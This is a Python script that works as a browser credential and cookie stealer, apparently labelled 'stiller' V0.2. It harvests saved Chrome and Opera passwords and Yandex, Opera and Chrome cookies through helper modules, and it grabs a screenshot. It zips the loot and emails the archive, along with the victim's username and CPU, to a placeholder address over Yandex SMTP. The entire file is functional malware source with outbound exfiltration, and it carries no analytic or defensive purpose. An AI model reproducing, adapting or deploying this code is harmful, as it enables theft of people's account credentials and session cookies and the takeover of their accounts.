# -*- coding: utf-8 -*-
import cookies
import passworld
import os
import zipfile
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab
import platform


print("V0.2")

file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
file.write(passworld.chrome())
file.close()

file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
file.write(passworld.opera() + '\n')
file.close()

file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")
file.write(cookies.yandex()+ '\n')
file.close()

file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")
file.write(cookies.opera() + '\n')
file.close()

file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
file.write(cookies.chrome() + '\n')
file.close()

screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')


zname= 'C:\\Users\\'+getpass.getuser()+'\\AppData\\log.zip'
newzip=zipfile.ZipFile(zname,'w')
newzip.write(os.getenv("APPDATA") + '\\google_pass.txt')
newzip.write(os.getenv("APPDATA") + '\\google_cookies.txt')
newzip.write(os.getenv("APPDATA") + '\\yandex_cookies.txt')
newzip.write(os.getenv("APPDATA") + '\\opera_pass.txt')
newzip.write(os.getenv("APPDATA") + '\\opera_cookies.txt')
newzip.write(os.getenv("APPDATA") + '\\sreenshot.jpg')
newzip.close()


fromaddr = "mail@mail.com" # email to send
toaddr = "mail2@mail.com"  #recipient's mail

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = getpass.getuser()+" stiller"

body = "cpu: "+ platform.processor()

msg.attach(MIMEText(body, 'plain'))

filename = "log.zip"
attachment = open('C:\\Users\\'+getpass.getuser() + '\\AppData\\log.zip', "rb")


part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)


server = smtplib.SMTP('smtp.yandex.com', 587) #smtp server

server.starttls()
server.login(fromaddr, "passworld")  #mail passworld
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
print("OK")